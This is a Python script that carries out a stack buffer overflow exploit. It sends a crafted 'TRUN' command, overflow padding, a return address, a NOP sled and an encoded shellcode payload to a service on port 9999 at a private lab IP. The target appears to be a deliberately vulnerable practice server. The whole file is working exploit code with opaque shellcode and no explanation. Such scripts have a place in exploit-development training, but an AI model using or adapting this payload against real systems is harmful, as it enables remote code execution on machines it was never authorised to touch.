#!/usr/bin/python

import sys, socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(('192.168.104.137', 9999))
data = sock.recv(1024)

buffer = 'TRUN /.:/'

buffer += "A"*2003

buffer += "\xaf\x11\x50\x62"

buffer += "\x90"*16

#buffer += "C"*200

#buffer += "\x53\x93\x42\x7E"

buffer += ("\xb8\x3a\xab\x12\xd4\xda\xd3\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x53\x31\x42\x12\x03\x42\x12\x83\xd0\x57\xf0\x21\xd8\x40\x77"
"\xc9\x20\x91\x18\x43\xc5\xa0\x18\x37\x8e\x93\xa8\x33\xc2\x1f"
"\x42\x11\xf6\x94\x26\xbe\xf9\x1d\x8c\x98\x34\x9d\xbd\xd9\x57"
"\x1d\xbc\x0d\xb7\x1c\x0f\x40\xb6\x59\x72\xa9\xea\x32\xf8\x1c"
"\x1a\x36\xb4\x9c\x91\x04\x58\xa5\x46\xdc\x5b\x84\xd9\x56\x02"
"\x06\xd8\xbb\x3e\x0f\xc2\xd8\x7b\xd9\x79\x2a\xf7\xd8\xab\x62"
"\xf8\x77\x92\x4a\x0b\x89\xd3\x6d\xf4\xfc\x2d\x8e\x89\x06\xea"
"\xec\x55\x82\xe8\x57\x1d\x34\xd4\x66\xf2\xa3\x9f\x65\xbf\xa0"
"\xc7\x69\x3e\x64\x7c\x95\xcb\x8b\x52\x1f\x8f\xaf\x76\x7b\x4b"
"\xd1\x2f\x21\x3a\xee\x2f\x8a\xe3\x4a\x24\x27\xf7\xe6\x67\x20"
"\x34\xcb\x97\xb0\x52\x5c\xe4\x82\xfd\xf6\x62\xaf\x76\xd1\x75"
"\xd0\xac\xa5\xe9\x2f\x4f\xd6\x20\xf4\x1b\x86\x5a\xdd\x23\x4d"
"\x9a\xe2\xf1\xf8\x92\x45\xaa\x1e\x5f\x35\x1a\x9f\xcf\xde\x70"
"\x10\x30\xfe\x7a\xfa\x59\x97\x86\x05\x74\x34\x0e\xe3\x1c\xd4"
"\x46\xbb\x88\x16\xbd\x74\x2f\x68\x97\x2c\xc7\x21\xf1\xeb\xe8"
"\xb1\xd7\x5b\x7e\x3a\x34\x58\x9f\x3d\x11\xc8\xc8\xaa\xef\x99"
"\xbb\x4b\xef\xb3\x2b\xef\x62\x58\xab\x66\x9f\xf7\xfc\x2f\x51"
"\x0e\x68\xc2\xc8\xb8\x8e\x1f\x8c\x83\x0a\xc4\x6d\x0d\x93\x89"
"\xca\x29\x83\x57\xd2\x75\xf7\x07\x85\x23\xa1\xe1\x7f\x82\x1b"
"\xb8\x2c\x4c\xcb\x3d\x1f\x4f\x8d\x41\x4a\x39\x71\xf3\x23\x7c"
"\x8e\x3c\xa4\x88\xf7\x20\x54\x76\x22\xe1\x64\x3d\x6e\x40\xed"
"\x98\xfb\xd0\x70\x1b\xd6\x17\x8d\x98\xd2\xe7\x6a\x80\x97\xe2"
"\x37\x06\x44\x9f\x28\xe3\x6a\x0c\x48\x26")

buffer += "\x90"*50

sock.send(buffer)

data = sock.recv(1024)

sock.close()
